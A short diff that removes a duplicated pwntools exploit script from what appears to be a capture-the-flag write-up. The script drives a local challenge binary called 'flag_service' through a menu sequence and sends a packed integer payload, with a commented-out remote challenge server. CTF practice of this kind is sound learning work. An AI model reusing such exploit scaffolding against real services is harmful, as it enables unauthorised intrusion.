@@ -196,50 +196,6 @@ sla(b"exit\n", "1")
 sl(p32(1) + p32(1))
 sla(b"exit\n", "4")
 
-p.interactive()#!/usr/bin/python
-from pwn import *
-import warnings
-import time
-
-warnings.filterwarnings("ignore",category=BytesWarning)
-
-exe = context.binary = ELF('./flag_service')
-libc = exe.libc
-
-host = "flag-service.warzone-challenges.com"
-port = 1339
-
-gdb_script = '''
-
-'''
-
-r = lambda x: p.recv(x)
-rl = lambda: p.recvline(keepends=False)
-ru = lambda x: p.recvuntil(x, drop=True)
-cl = lambda: p.clean(timeout=1)
-s = lambda x: p.send(x)
-sa = lambda x, y: p.sendafter(x, y)
-sl = lambda x: p.sendline(x)
-sla = lambda x, y: p.sendlineafter(x, y)
-ia = lambda: p.interactive()
-li = lambda s: log.info(s)
-ls = lambda s: log.success(s)
-
-def debug():
-  gdb.attach(p)
-  p.interactive()
-
-p = exe.process()
-# p = remote(host,port)
-#p = gdb.debug('./', gdbscript = gdb_script)
-
-sla(b"exit\n", "2")
-sl("1")
-sla(b"exit\n", "3")
-sla(b"exit\n", "1")
-sl(p32(1) + p32(1))
-sla(b"exit\n", "4")
-
 p.interactive()
 ```
 
